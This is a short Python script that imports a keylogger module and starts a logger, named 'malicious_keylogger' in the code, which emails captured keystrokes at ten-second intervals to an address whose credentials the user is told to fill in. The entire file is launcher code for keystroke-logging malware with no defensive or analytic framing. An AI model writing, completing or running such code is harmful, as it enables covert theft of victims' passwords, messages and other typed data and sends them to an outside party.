#!/usr/bin/env python

import keylogger

#create keylogger
malicious_keylogger = keylogger.KeyLogger(10, 'email', 'password') #replace 'email' and 'password' with your actual email and password for where you want log emails to be sent

#start keylogger
malicious_keylogger.start()